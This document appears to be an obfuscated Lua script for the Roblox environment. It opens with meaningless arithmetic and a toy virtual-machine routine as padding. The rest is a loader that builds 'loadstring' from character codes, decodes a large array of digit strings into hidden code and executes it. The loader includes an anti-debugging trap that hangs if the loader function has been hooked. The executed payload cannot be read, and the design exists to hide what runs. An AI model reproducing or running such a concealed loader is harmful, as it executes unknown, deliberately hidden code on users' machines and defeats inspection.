local function a(b) return b + 2 end local function c(d) return d * 2 end local function e(f, g) return f - g end local function h(i, j) return i / j end local function k(l) return l ^ 2 end local function m(n) return n % 3 end local p = 5 local q = a(p) local r = c(q) local s = e(r, p) local t = h(s, p) local u = k(t) local v = m(u) local x = 10 local y = a(x) local z = e(y, 4) local w = c(z) local j1 = h(w, 3) local k1 = m(j1) local function l1() return p * q end local function l2() return e(r, s) end local function l3() return t + u end local function l4() return v - w end local z1 = l1() local z2 = l2() local z3 = l3() local z4 = l4() local t1 = a(z1) local t2 = c(z2) local t3 = e(z3, z4) local t4 = h(t1, t2) local t5 = m(t3) local function n1(x) return x * 4 end local function n2(y) return y + 5 end local function n3(z) return z - 10 end local result1 = n1(t5) local result2 = n2(result1) local result3 = n3(result2) local temp = result3 + 100 local final = temp / 10 local vm = {} vm.registers = {A = 0, B = 0, C = 0, D = 0} vm.memory = {} vm.stack = {} vm.pc = 1 vm.code = {} local function op_add(r1, r2) return r1 + r2 end local function op_sub(r1, r2) return r1 - r2 end local function op_mul(r1, r2) return r1 * r2 end local function op_div(r1, r2) if r2 == 0 then return 0 else return r1 / r2 end end local function dummy1(a, b) local c = a + b local d = a * b local e = c - d local f = h(c, b + 1) return f + d end local function dummy2(x) local y = x * 2 local z = x - y return z + a(x) end local instr_set = {} instr_set["ADD"] = function(reg, val) vm.registers[reg] = vm.registers[reg] + val end instr_set["SUB"] = function(reg, val) vm.registers[reg] = vm.registers[reg] - val end instr_set["MUL"] = function(reg, val) vm.registers[reg] = vm.registers[reg] * val end instr_set["DIV"] = function(reg, val) vm.registers[reg] = vm.registers[reg] / val end local program = { {"ADD", "A", 5}, {"MUL", "B", 3}, {"SUB", "C", 2}, {"DIV", "D", 4}, {"ADD", "A", 7}, {"MUL", "C", 2}, {"SUB", "B", 1}, {"DIV", "A", 2}, {"ADD", "D", 10}, {"SUB", "C", 3}, {"MUL", "B", 4}, {"DIV", "D", 2} } local function load_program(prog) for i = 1, #prog do vm.code[i] = prog[i] end end local function execute_program() for i = 1, #vm.code do local inst = vm.code[i] local op = inst[1] local reg = inst[2] local val = inst[3] if instr_set[op] then instr_set[op](reg, val) end end end local function vm_initialization() vm.registers.A = final vm.registers.B = p + x vm.registers.C = z1 vm.registers.D = t4 for i = 1, 50 do vm.stack[i] = (i * 3) % 7 end for i = 1, 100 do vm.memory[i] = i % 5 end end local function vm_loop() local count = 0 while count < 100 do vm.pc = vm.pc + 1 vm.registers.A = op_add(vm.registers.A, dummy1(count, vm.pc)) vm.registers.B = op_sub(vm.registers.B, dummy2(count)) vm.registers.C = op_mul(vm.registers.C, 1.001) vm.registers.D = op_div(vm.registers.D, 1.002) count = count + 1 end end local function auxiliary() local arr = {} for i = 1, 30 do arr[i] = i * a(i) - c(i) end local sum = 0 for i = 1, #arr do sum = sum + arr[i] end local prod = 1 for i = 1, #arr do prod = op_mul(prod, (arr[i] % 5 + 1)) end local mix = dummy1(sum, prod) for i = 1, 20 do mix = op_add(mix, dummy2(i)) end vm.registers.A = vm.registers.A + mix end vm_initialization() load_program(program) execute_program() vm_loop() auxiliary() local _____plp = {_____x__ = {p__xll_x = table.concat},_x_xvf_z = {___Ilxx_ = loadstring},Il______ = {_z__f__n = tonumber},_x__nfz_ = {_z_Ilxxz = string.char},____l_n_ = { ___q___v = setmetatable}, z_v_lf__ = { ev__v_v_ = nil} } local __v_vzex = _____plp._____x__.p__xll_x local _zl___f_ = _____plp._x_xvf_z.___Ilxx_ local _f_vv_Ix = _____plp.Il______._z__f__n local x_z_e__I = _____plp._x__nfz_._z_Ilxxz local I_qx____ = _____plp.____l_n_.___q___v local _z_p_npx = _____plp.z_v_lf__.ev__v_v_ local I_x_zpne = x_z_e__I(108, 111, 97, 100, 115, 116, 114, 105, 110, 103) function vqexIznn(_q_venfx) local luacrypt_so_tuff = "ts pmo icl dnt pmo wrd2foenem" local xq_v__n_ = _q_venfx local _qnln_nq = setclipboard local _Iv__e__ = toclipboard local function ____nz_f(__e_____) return function() return __e_____ end end local __zn___n = warn local function n__fx___(e_f_x___) return ____nz_f(e_f_x___)() end local ez_Iq___ = error local function _z_____v() while true do end end local xp__qq__ = print local function xl__f_nx() return n__fx___(math.random(100, 999)) end local __x_lI_q = game local _v_If_e_ = {_zl___f_,__x_lI_q,xp__qq__,__zn___n,ez_Iq___,_qnln_nq,_Iv__e__} if _v_If_e_[1] == _v_If_e_[3] or _v_If_e_[1] == _v_If_e_[4] or _v_If_e_[1] == _v_If_e_[5] or _v_If_e_[1] == _v_If_e_[6] or _v_If_e_[1] == _v_If_e_[7] then _z_____v() end local function _v_np_zf(zI____z_) local function _qIeq_q_(__n__l__) return x_z_e__I(_f_vv_Ix(__n__l__, 2)) end xl__f_nx() local _______f = zI____z_:gsub("[^01]", "") return _______f:gsub("(".. ("[01]"):rep(8) .. ")", _qIeq_q_) end local ____z_pl = _v_np_zf(xq_v__n_) local sporty = game:GetService("Workspace") local function q_e___p_(___n__qx) local __x_v___, __fe_z__, eIll__l_, e__I__x_ = "l", "o", "a", "d" local pf_v___f, I_n____e, v___fevx, I__l_ee_ = "s", "t", "r", "i" local _n____np, _lev__x_ = "n", "g" local function _pl__pz_(...) local e___x_vq, _nn_v___ = {...}, "" for i = 1, #e___x_vq do _nn_v___ = _nn_v___ .. e___x_vq[i] end return _nn_v___ end local lx____lx = _pl__pz_(__x_v___, __fe_z__, eIll__l_, e__I__x_, pf_v___f, I_n____e, v___fevx, I__l_ee_, _n____np, _lev__x_) local v_lI_z_l = ("%s"):format(lx____lx) local vlxlv_nn, I__qq_z_ = pcall(_zl___f_(___n__qx)) local e___nn_I, z__e_z_I, _____e__ = "RZ__ZSFWVGXWF_WDG__FSW_GS_FQ__DGSDSWZXG__FGFG___Z_", "V__F_DXF__GR_______QF__ZV____W____XD__VXF____FFFGQ", "_WX_D_GF___S__GSXWS_WFRF_DR__X_FVWQ___VDRFD___FSWW" local xl_nq_q_ = (2 * 5 / 10 + 3 - 3) ^ 1 if not vlxlv_nn then local _vz_x_xI = { e___nn_I, z__e_z_I, _____e__, xl_nq_q_ } for i = 1, # _vz_x_xI do _vz_x_xI[i] = _vz_x_xI[i] .. "_extra" end end return I__qq_z_ end q_e___p_(____z_pl, _____plp.z_v_lf__.ev__v_v_); xl__f_nx() local __pp__ve = I_qx____( { l__l_pI_ = { l_____n_ = { qleq_en_, _x_xp___, n___xl__ }, x_x_eez_ = function() for lIn_nfxz = 1, 50 do local If_Innpz = lIn_nfxz * 2 local _fqexq_I = {lIn_nfxz, lIn_nfxz * 10, lIn_nfxz * 100} end return _____plp.z_v_lf__.ev__v_v_ end }, ____l__z = { [true] = { function() for ___I__vv = 1, 100 do local _x_vvp__ = ___I__vv * ___I__vv if _x_vvp__ > 100 then break end end end }, [false] = { { function() return false end }, function() for _qpIevx_ = 1, 10 do local pq_zz_q_ = _qpIevx_ * 2 end end } } }, { __index = function(_, l_p___v_) local pxx__n__ = "Lua Crypt1" if l_p___v_ == "print" then for xze_xxI_ = 1, 100 do local e_e_ff__ = xze_xxI_ * xze_xxI_ + xze_xxI_ end return print elseif l_p___v_ == "warn" then for _pnn_x__ = 1, 50 do local xllI_pIl = _pnn_x__ * 3 if xllI_pIl == 150 then return warn end end end return _____plp.z_v_lf__.ev__v_v_ end } ) end vqexIznn(__v_vzex({'053493176375133674099642133643194992049234072945','042265123636167673044462129492134236134639193992','044745145473156979069292064374022997027694134653','054574177725157763022666033369139533029627043935','035566133925144963157556069624075527133752152643','099543199259175629133579077325133956074992074442','054633154527137746137423042363025495175625063447','065522156443147554077575143549064225025547177232','027729129777164326054272146579147222145345063523','032556176427195446054634023979166427125632166695','032344043723136696067936195236079724047422064972','052947144973142563055677035797159675156792136495','095935167595196723056652056674064395052674156247','059652197225196427093269199944167799042655179343','092455174362193923033259039267132636049745192353','035453035949169595169646175579032674146255043669','024597167354069963093637176657034954026777025954','093679196995166495176327097729149444073665067293','024342195252129467167547032332172754035265096492','034227174763152396165797027736077566095245044966','079759173566076944043692062626144266192347159626','049645159977149276046566076295136963034965179294','097345144659154746137359097262147647092746095656','034475076445192379032936166523023334026647054326','027356059332199449047675079795196552172675166945','066437153732155946023965199364056495093963055526','032657125734134965157367099629143592092794053525','092539146434156297146269094439123937073979075634','036479135747132342176747099692054936065645053634','067394123272163767195966059725096473193632137647','054535025296162392152739122995057332166697092749','039247022796144763022943154374124933133749143277','092567076569133773072277196956167275174699173543','049669124539164946137546044299032265074657096256','027655166969132557023649023655049439056252174354','077726159594166349125245049996073552177535122737','074566195693145447163645096726195337056523095737','099567169672125953034694053632196476049355162945','094954197345145362075555064273073359139743034639','039737174627139423075736194753079624042254144672','026442165644145539092526174347124264195646024529','072454092597176746064625179442195493137764065367','067574126266164962032665069423055753154346177592','026645169654132925096425167262176626197472162464','097379127436153752067443124942154343055422122457','023923032925125636034766172775174443133479163772','094453143645169969147962093949054729192392092229','076449163673192454067472079934039776062545124279','033762197997136759176953037979134525166567152939','023575063539176659034725164355124375149449177342','023363199297026223196559059597079953039969125297','027365165292133394093422157746059994035649094424','042273172694156956096746179497067296123657066743','032342125744039737066959059633195244126636025259','032599156939177399055723047536192974057645054742','095754137745053674025237097223022379039365197765','076532126475136447124797052355034225196934033477','065246133744052935166359064246065732073733172276','033762047695123952067795056579133355165376194764','063543074325139723059729122246073242036475132662','092743097946156329099534193524059953025599179663','036392025549147396029527127753026696072646076592','079339029947156945059929199926053477092596162932'}))
